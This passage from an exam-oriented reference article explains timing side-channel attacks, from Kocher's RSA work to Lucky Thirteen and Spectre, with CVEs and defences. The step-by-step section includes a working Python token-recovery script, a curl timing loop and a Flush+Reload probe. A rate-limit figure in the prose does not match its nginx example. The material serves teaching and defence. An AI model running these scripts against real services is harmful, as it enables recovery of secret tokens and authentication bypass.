---
domain: "cryptography and application security"
tags: [timing-attack, side-channel, cryptography, web-security, exploit, authentication]
---
# Timing Attacks

A **timing attack** is a class of **side-channel attack** in which an adversary infers secret information by measuring the time it takes for a system to perform cryptographic or computational operations. Unlike attacks that target algorithm weaknesses directly, timing attacks exploit **implementation details** — specifically, the fact that operations on different inputs (e.g., correct vs. incorrect passwords) may take measurably different amounts of time. These attacks are relevant across [[cryptography]], [[authentication]], and [[web application security]].

---

## Overview

Timing attacks belong to the broader family of [[side-channel attacks]], which exploit physical or observable characteristics of a system rather than mathematical weaknesses in an algorithm. The fundamental insight is that a program's execution time can leak information about its internal state. If a secret comparison terminates early when it finds a mismatch — as naive string comparison functions do — an attacker who can make repeated queries and measure response times can deduce the correct value one character at a time.

The concept was formalized by Paul Kocher in his seminal 1996 paper *"Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems."* Kocher demonstrated that RSA private key bits could be recovered simply by measuring how long a smartcard took to perform modular exponentiation operations. The time variation arose because certain intermediate computations (square-and-multiply algorithms) take different amounts of time depending on whether specific key bits are 0 or 1. This was a watershed moment because RSA was considered mathematically secure, yet its real-world implementation was vulnerable.

In web applications, timing attacks are particularly common against authentication systems. A login function that compares a submitted password hash against a stored hash using a non-constant-time function (such as C's `strcmp()` or Python's `==` operator on strings) will return more quickly when the first character differs than when many characters match. By sending thousands of requests and statistically analyzing response times, an attacker can determine the correct hash value byte by byte, even without ever seeing it directly.

Network timing attacks face an additional challenge: network jitter introduces noise that can obscure small timing differences. However, statistical techniques — including averaging over thousands of requests, using co-located servers, or exploiting high-precision timers available in browsers via `performance.now()` — can amplify subtle signals. The **Flush+Reload** and **Prime+Probe** cache timing attacks against CPU caches (exploited in [[Spectre and Meltdown]]) demonstrate that timing channels extend all the way down to the microarchitectural level.

Remote timing attacks have been demonstrated against TLS implementations, SSH, and even DNS resolvers. The **Lucky Thirteen** attack (2013) exploited timing differences in CBC-mode padding validation in TLS to perform a [[padding oracle attack]] with a timing oracle rather than an error message oracle, breaking confidentiality in DTLS and TLS without any network-level error responses.

---

## How It Works

### Conceptual Foundation

Every conditional branch in code that involves a secret value is a potential timing oracle. Consider password verification:

```python
# VULNERABLE: non-constant-time comparison
def verify_password(submitted, stored_hash):
    submitted_hash = hash(submitted)
    return submitted_hash == stored_hash  # exits early on first mismatch
```

When the first byte of `submitted_hash` differs from `stored_hash`, the comparison returns immediately. When the first 10 bytes match, the comparison runs 10 iterations before failing. This creates a measurable time difference per matching byte.

### Step-by-Step Attack Process

**Step 1 — Identify a timing oracle**
The attacker identifies an endpoint where the response time varies based on a secret. This could be a login form, an HMAC validation endpoint, an API key checker, or a cryptographic operation.

**Step 2 — Establish a baseline**
Send a large number of requests with a known-wrong input to establish baseline timing. Due to network jitter, many samples are needed.

```bash
# Using curl to measure response time (baseline)
for i in $(seq 1 1000); do
    curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST https://target.example.com/api/verify \
    -d '{"token":"AAAAAAAAAAAAAAAA"}' >> baseline_times.txt
done
```

**Step 3 — Enumerate character by character**
Fix all positions except one and iterate through all possible values. The value that produces the longest average response time is likely correct.

```python
import requests
import time
import statistics
import string

TARGET = "http://localhost:5000/api/verify"
CHARSET = string.ascii_letters + string.digits
SAMPLES = 200

def measure_time(token):
    times = []
    for _ in range(SAMPLES):
        start = time.perf_counter()
        requests.post(TARGET, json={"token": token})
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return statistics.mean(times)

# Guess token character by character
known = ""
TOKEN_LENGTH = 16

for position in range(TOKEN_LENGTH):
    best_char = None
    best_time = 0
    for char in CHARSET:
        candidate = known + char + "A" * (TOKEN_LENGTH - len(known) - 1)
        t = measure_time(candidate)
        if t > best_time:
            best_time = t
            best_char = char
    known += best_char
    print(f"[+] Position {position}: {best_char}  (known so far: {known})")

print(f"[*] Recovered token: {known}")
```

**Step 4 — Account for noise**
Statistical noise from network latency, CPU scheduling, and garbage collection can obscure timing differences. Mitigations include:
- Taking the **minimum** (not mean) of many samples (network jitter is additive; min approaches true computation time)
- Running from the **same network segment** or localhost
- Using **high-resolution timers**: Python's `time.perf_counter()`, JavaScript's `performance.now()`

**Step 5 — Cache-based variants (CPU-level)**
For microarchitectural timing attacks like Spectre, the attacker:
1. Trains the branch predictor to speculatively execute a target path
2. Causes the CPU to speculatively access a memory location based on a secret value
3. Measures cache timing using `rdtsc` (CPU timestamp counter) to determine which cache lines were loaded, inferring the secret value

```c
// Simplified Flush+Reload concept
flush_cache_line(probe_array[secret_byte * 512]);  // evict from cache
// ... trigger speculative execution ...
// Measure access time for each array element
for (int i = 0; i < 256; i++) {
    uint64_t t1 = rdtsc();
    volatile int x = probe_array[i * 512];
    uint64_t t2 = rdtsc();
    if (t2 - t1 < CACHE_HIT_THRESHOLD) {
        // This index was accessed — secret_byte == i
    }
}
```

**Applicable Protocols and Services**
| Protocol | Timing Oracle | Attack Surface |
|---|---|---|
| TLS/HTTPS | CBC padding validation | Lucky Thirteen |
| SSH | Public key authentication | Username enumeration |
| HTTP API | HMAC/token comparison | API key recovery |
| JWT | Signature verification | Token forgery |
| Password login | Hash comparison | Credential bypass |

---

## Key Concepts

- **Side-channel attack**: An attack that exploits information gained from the physical implementation of a system (time, power consumption, electromagnetic emissions) rather than weaknesses in the algorithm itself. Timing attacks are the most practically exploitable side channel in networked environments.

- **Constant-time comparison**: A comparison function that always takes the same amount of time regardless of where a mismatch occurs. Achieved by examining every byte of both inputs and accumulating a result without early exit. Python's `hmac.compare_digest()` and C's `CRYPTO_memcmp()` are constant-time implementations.

- **Timing oracle**: Any system component that reveals information about a secret through execution time differences. The "oracle" term is borrowed from cryptography, where an oracle is a black box that answers queries with information that can be exploited.

- **Statistical amplification**: The technique of sending many repeated timing queries and averaging results to overcome noise. As sample count increases, the signal-to-noise ratio improves, making even nanosecond-level differences detectable over a noisy network.

- **Cache timing attack**: A subset of timing attacks that measures the state of CPU caches to infer what data was recently accessed. **Flush+Reload**, **Prime+Probe**, and **Evict+Time** are specific techniques. These underpin **Spectre** and **Meltdown** vulnerabilities.

- **Lucky Thirteen**: A 2013 attack by AlFardan and Paterson against TLS/DTLS CBC-mode implementations that exploited a 13-byte timing difference in MAC computation to perform a padding oracle attack entirely through response time measurement, without requiring error messages.

- **Kocher's attack**: The foundational 1996 timing attack by Paul Kocher against RSA, DSS, and Diffie-Hellman implemented on smartcards. It demonstrated that private key bits could be recovered by measuring modular exponentiation time, proving that mathematically secure algorithms can be insecurely implemented.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Timing attacks fall primarily under **Domain 2.0 – Threats, Vulnerabilities, and Mitigations** (2.2 – Threat Vectors and Attack Surfaces; 2.3 – Application Vulnerabilities).

**Key exam facts to memorize:**
- Timing attacks are classified as **side-channel attacks** — expect questions that ask you to identify the category
- The defensive control is **constant-time algorithms** / **constant-time comparison** functions
- Timing attacks do **not** require breaking an encryption algorithm mathematically — this distinguishes them from brute-force or cryptanalytic attacks
- **HMAC** verification is a common target; `hmac.compare_digest()` is the correct mitigation when the Security+ exam mentions timing-safe functions

**Common question patterns:**
- *"An attacker measures response times from an authentication API to infer valid credentials. What type of attack is this?"* → Side-channel attack / timing attack
- *"Which function should a developer use to compare HMAC signatures to prevent timing attacks?"* → Constant-time comparison function
- *"A developer uses `strcmp()` to compare password hashes. What vulnerability does this introduce?"* → Timing attack via early exit comparison

**Gotchas:**
- Do not confuse timing attacks with **replay attacks** (which reuse captured credentials) or **brute-force attacks** (which try all possibilities without statistical inference)
- The Security+ exam may refer to the broader category as "side-channel" rather than specifically "timing" — know both terms
- Timing attacks can apply to **both symmetric and asymmetric** cryptographic operations — not just password comparisons

---

## Security Implications

### Vulnerabilities and CVEs

**CVE-2003-0693 — OpenSSH timing attack on usernames**: OpenSSH versions before 3.7.1 responded measurably faster to authentication attempts for non-existent users versus existing users, enabling username enumeration through timing differences. This was a real-world deployment of a username oracle.

**CVE-2013-0169 — Lucky Thirteen (TLS/DTLS CBC padding)**: Affected OpenSSL, GnuTLS, and NSS. By exploiting a 13-byte timing difference in HMAC computation during CBC-mode padding validation in TLS 1.1 and 1.2, an attacker in a man-in-the-middle position could recover plaintext by sending ~2^23 modified TLS records. No error messages were needed — pure timing.

**CVE-2017-5715 / CVE-2017-5753 — Spectre Variants 1 and 2**: The most impactful timing attacks in computing history. These exploited CPU speculative execution combined with cache timing to allow JavaScript running in a browser to read kernel memory, and VMs to read hypervisor memory. The attack relied entirely on measuring cache access time using `rdtsc` to infer speculatively accessed memory contents.

**CVE-2018-0737 — OpenSSL RSA key generation timing**: A cache timing attack during RSA key generation in OpenSSL's primality testing could allow a local attacker with access to the same cache to potentially recover key material.

### Attack Vectors
- **Remote timing attacks**: HTTP/HTTPS API endpoints, SSH authentication, OAuth token validation
- **Local cache attacks**: Shared-CPU environments (cloud VMs, shared hosting, browsers executing JavaScript)
- **Hardware-level attacks**: Smartcards, HSMs, embedded systems where power and timing are directly measurable

### Detection Challenges
Timing attacks are extremely difficult to detect because:
- They generate no error conditions or anomalous payloads
- They look identical to legitimate traffic at the network level
- Detection requires statistical analysis of access patterns and timing distributions
- A [[SIEM]] or [[IDS]] would need to correlate thousands of requests to the same endpoint as suspicious

---

## Defensive Measures

### 1. Use Constant-Time Comparison Functions

**Python:**
```python
import hmac

# CORRECT: constant-time comparison
def verify_token(submitted_token, stored_token):
    return hmac.compare_digest(submitted_token.encode(), stored_token.encode())

# WRONG: early-exit comparison
def verify_token_vulnerable(submitted_token, stored_token):
    return submitted_token == stored_token
```

**C (OpenSSL):**
```c
#include <openssl/crypto.h>
// CORRECT
if (CRYPTO_memcmp(received_mac, expected_mac, MAC_LEN) != 0) {
    // reject
}
// WRONG
if (memcmp(received_mac, expected_mac, MAC_LEN) != 0) { ... }
```

**Node.js:**
```javascript
const crypto = require('crypto');
// CORRECT
if (!crypto.timingSafeEqual(Buffer.from(submitted), Buffer.from(stored))) {
    return false;
}
```

### 2. Add Deliberate Timing Noise

Add a random sleep to authentication endpoints to mask any residual timing differences:

```python
import time
import random

def authenticate(username, password):
    start = time.monotonic()
    result = check_credentials(username, password)
    # Ensure minimum response time regardless of outcome
    elapsed = time.monotonic() - start
    time.sleep(max(0, 0.1 - elapsed) + random.uniform(0, 0.05))
    return result
```

> ⚠️ Note: Random delays are a mitigation, not a solution. They increase the sample count needed but do not eliminate the channel. Constant-time implementations are the correct fix.

### 3. Rate Limiting and Lockout

Implement [[rate limiting]] on authentication and verification endpoints to make statistical timing attacks impractical:
- Max 5 requests per 10 seconds per IP on login endpoints
- Enforce using **Nginx** `limit_req_zone`, **Cloudflare rate limiting**, or [[WAF]] rules
- Use CAPTCHA after repeated failures

```nginx
# Nginx rate limiting for login endpoint
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

location /api/login {
    limit_req zone=login burst=10 nodelay;
    proxy_pass http://backend;
}
```

### 4. Cryptographic Best Practices

- Use **HMAC** for all authentication token verification, not raw hash comparison
- Use **authenticated encryption** (AES-GCM, ChaCha20-Poly1305) rather than CBC mode to eliminate padding oracles and associated timing channels
- For RSA, use **RSA blinding** (multiplying by a random value before decryption) — all modern TLS libraries enable this by default; verify it is not disabled

### 5. OS and Hardware Mitigations (Spectre/Meltdown)

- Apply CPU **microcode updates** from Intel/AMD
- Enable **kernel page-table isolation (KPTI)** and **Retpoline** compiler mitigations
- In browsers, reduce `performance.now()` resolution and disable `SharedArrayBuffer` without COOP/COEP headers (already done by major browsers post-Spectre)
- On cloud platforms, use **dedicated